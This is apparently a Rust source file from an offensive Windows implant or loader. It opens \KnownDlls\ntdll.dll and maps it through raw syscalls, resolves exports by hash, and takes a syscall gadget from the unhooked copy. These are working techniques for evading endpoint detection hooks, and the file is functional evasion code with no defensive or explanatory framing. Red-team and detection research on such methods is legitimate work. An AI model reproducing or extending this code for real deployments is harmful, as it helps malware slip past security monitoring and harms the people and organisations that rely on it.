use crate::hash;
use crate::ntdll;
use crate::syscall::{self, Targets};
use core::ptr;

const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const SECTION_MAP_READ: usize = 0x0004;
const SECTION_MAP_EXECUTE: usize = 0x0008;
const VIEW_SHARE: usize = 1;
const PAGE_READONLY: usize = 0x02;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut u8,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut u8,
    security_quality_of_service: *mut u8,
}

#[derive(Clone, Copy, Debug)]
pub struct CleanMapping {
    pub base: usize,
    pub size: usize,
    pub gadget: usize,
    section_handle: isize,
    unmap_ssn: u32,
    close_ssn: u32,
    mapper_gadget: usize,
}

impl CleanMapping {
    pub unsafe fn release(&self) {
        if self.base == 0 {
            return;
        }
        if self.unmap_ssn != 0 {
            let _ = syscall::raw(
                self.unmap_ssn,
                self.mapper_gadget,
                [syscall::CURRENT_PROCESS, self.base, 0, 0, 0, 0, 0, 0, 0, 0],
            );
        }
        if self.close_ssn != 0 {
            let _ = syscall::raw(
                self.close_ssn,
                self.mapper_gadget,
                [self.section_handle as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            );
        }
    }
}

pub unsafe fn map_clean_ntdll(t: &Targets) -> Option<CleanMapping> {
    let loaded = t.ntdll_base as *mut u8;
    let nt_open = ntdll::resolve_export(loaded, hash::NOPEN_SECTION);
    let nt_map = ntdll::resolve_export(loaded, hash::NMAP_VIEW);
    let nt_unmap = ntdll::resolve_export(loaded, hash::NUNMAP);
    let nt_close = ntdll::resolve_export(loaded, hash::NCLOSE);
    if nt_open.is_null() || nt_map.is_null() {
        return None;
    }

    let open_ssn = ntdll::syscall_number_robust(loaded, nt_open)?;
    let map_ssn = ntdll::syscall_number_robust(loaded, nt_map)?;
    let unmap_ssn = ntdll::syscall_number_robust(loaded, nt_unmap).unwrap_or(0);
    let close_ssn = ntdll::syscall_number_robust(loaded, nt_close).unwrap_or(0);
    let mapper_gadget = t.gadget;

    // "\KnownDlls\ntdll.dll" as UTF-16; must outlive the syscall.
    let mut name: Vec<u16> = "\\KnownDlls\\ntdll.dll".encode_utf16().collect();
    let mut us = UnicodeString {
        length: (name.len() * 2) as u16,
        maximum_length: (name.len() * 2 + 2) as u16,
        buffer: name.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null_mut(),
        object_name: &mut us,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };

    let mut handle: isize = 0;
    let status = syscall::raw(
        open_ssn,
        mapper_gadget,
        [
            &mut handle as *mut _ as usize,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            &mut oa as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
        ],
    );
    if status < 0 || handle == 0 {
        return None;
    }

    let mut base: *mut u8 = ptr::null_mut();
    let mut size: usize = 0;
    let status = syscall::raw(
        map_ssn,
        mapper_gadget,
        [
            handle as usize,
            syscall::CURRENT_PROCESS,
            &mut base as *mut _ as usize,
            0,
            0,
            ptr::null_mut::<u8>() as usize, // SectionOffset = NULL -> offset 0
            &mut size as *mut _ as usize,
            VIEW_SHARE,
            0,
            PAGE_READONLY,
        ],
    );
    if status < 0 || base.is_null() {
        if close_ssn != 0 {
            let _ = syscall::raw(
                close_ssn,
                mapper_gadget,
                [handle as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            );
        }
        return None;
    }

    let clean_alloc = ntdll::resolve_export(base, hash::NALLOC);
    let gadget = ntdll::syscall_gadget(clean_alloc)?;

    Some(CleanMapping {
        base: base as usize,
        size,
        gadget,
        section_handle: handle,
        unmap_ssn,
        close_ssn,
        mapper_gadget,
    })
}
